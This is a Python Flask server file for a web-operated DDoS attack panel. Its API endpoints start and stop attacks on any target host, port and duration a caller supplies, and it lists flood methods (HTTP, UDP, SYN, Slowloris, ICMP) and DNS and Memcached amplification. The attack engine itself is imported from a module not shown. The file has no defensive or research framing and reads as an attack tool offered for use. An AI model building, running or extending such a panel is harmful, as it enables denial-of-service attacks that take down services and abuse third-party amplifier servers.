from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from core_engine import DDOSEngine
import os

app = Flask(__name__, static_folder='../frontend', static_url_path='')
CORS(app)

engine = DDOSEngine()

# Serve frontend
@app.route('/')
def serve_frontend():
    return send_from_directory(app.static_folder, 'index.html')

# API ENDPOINTS
@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    data = request.json
    attack_type = data.get('type')
    target = data.get('target')
    port = data.get('port', 80)
    duration = data.get('duration', 60)
    
    result = engine.start_attack(
        attack_type=attack_type,
        target=target,
        port=port,
        duration=duration
    )
    return jsonify(result)

@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    result = engine.stop_attack()
    return jsonify(result)

@app.route('/api/stats', methods=['GET'])
def get_stats():
    return jsonify(engine.get_stats())

@app.route('/api/methods', methods=['GET'])
def get_methods():
    methods = [
        {"id": "http", "name": "HTTP Flood", "desc": "Layer 7 - Membanjiri server web dengan request HTTP", "icon": "🌐"},
        {"id": "udp", "name": "UDP Flood", "desc": "Layer 4 - Membanjiri port dengan paket UDP", "icon": "📦"},
        {"id": "syn", "name": "SYN Flood", "desc": "Layer 4 - Menghabiskan koneksi TCP", "icon": "🤝"},
        {"id": "slowloris", "name": "Slowloris", "desc": "Layer 7 - Menahan koneksi tetap terbuka", "icon": "🐌"},
        {"id": "icmp", "name": "ICMP Flood", "desc": "Layer 3 - Membanjiri dengan ping request", "icon": "📡"},
        {"id": "dns", "name": "DNS Amplification", "desc": "Amplifikasi menggunakan DNS server", "icon": "🔍"},
        {"id": "memcached", "name": "Memcached Amp", "desc": "Amplifikasi menggunakan Memcached", "icon": "💾"}
    ]
    return jsonify(methods)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
